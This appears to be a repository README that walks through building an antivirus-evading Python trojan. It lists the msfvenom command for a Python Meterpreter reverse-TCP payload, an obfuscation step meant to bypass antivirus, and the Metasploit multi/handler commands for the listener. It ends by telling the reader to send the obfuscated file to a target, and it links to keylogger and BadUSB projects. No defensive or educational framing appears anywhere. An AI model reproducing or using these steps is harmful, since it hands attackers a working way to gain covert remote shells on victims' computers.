# Create python trojan with Metasploit and bypass all antiviruses (READ THIS AS CODE)

1 : Install python and metasploit or using kali linux

2 : Next install requreiments

3 : Create payload and obfuscation it 

4 : Build up listener with metasploit and send payload obfuscation to target 

# Requreiments 

pip install PyObfuscator

Optional : if you want you can change it to exe file after obfuscation it for doing this read it ( https://github.com/CharonDefalt/Bad-usb OR https://github.com/CharonDefalt/python-keylogger )

# Create payload

msfvenom -p python/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -o payload.py

After that lets obfuscation it with below command :

PyObfuscator payload.py

# Build listener

use multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST YOURIP
set lport YOURPORT
run

# Final Part
Now send this file ( payload_obfu.py ) to target


